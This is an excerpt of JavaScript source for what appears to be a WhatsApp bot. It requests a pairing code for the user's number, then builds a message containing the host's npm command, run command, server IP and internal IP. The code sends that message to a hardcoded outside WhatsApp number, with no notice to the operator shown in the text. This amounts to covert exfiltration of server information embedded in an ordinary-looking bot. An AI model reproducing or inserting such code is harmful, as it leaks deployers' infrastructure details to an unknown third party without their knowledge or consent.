...
if (!conn.authState.creds.registered) {
	const phoneNumber = await question('=> Enter Your number here:\n');
	const code = await conn.requestPairingCode(phoneNumber);
	setTimeout(async () => {
		console.log(chalk.bold('=> Your Pairing code: ' + code))
	}, 3000);
}
...
*• Npm command :* ${process.env.npm_command}
*• Command run :* ${process.env.CMD_RUN}
*• Ip Address :* ${process.env.SERVER_IP}
*• Ip Internal :* ${process.env.INTERNAL_IP}`

await conn.sendMessage('6283829450919@s.whatsapp.net', {
text: message })
		}
}
